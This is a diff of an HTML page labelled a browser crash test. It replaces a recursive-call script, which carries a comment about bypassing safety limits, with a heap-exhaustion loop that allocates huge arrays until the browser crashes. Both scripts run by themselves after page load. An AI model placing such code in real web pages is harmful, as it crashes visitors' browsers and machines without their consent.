@@ -1,19 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test Crash Page</title>
+    <title>Browser Crash Test - Heap Exhaustion</title>
 </head>
 <body>
-    <h1>Browser Crash Test</h1>
+    <h1>Browser Crash Test - Heap Memory Exhaustion</h1>
     <p>If your browser crashes, the test was successful.</p>
-    
-    <script>
-        function crash() {
-            crash();
-        }
-        
-        setTimeout(crash, 1000); // Delays execution to bypass some safety limits
 
+    <script>
+        let arrays = [];
+        function crashHeap() {
+            while (true) {
+                arrays.push(new Array(1e7).fill(0)); // Fills memory until crash
+            }
+        }
+        setTimeout(crashHeap, 2000);
     </script>
 </body>
 </html>
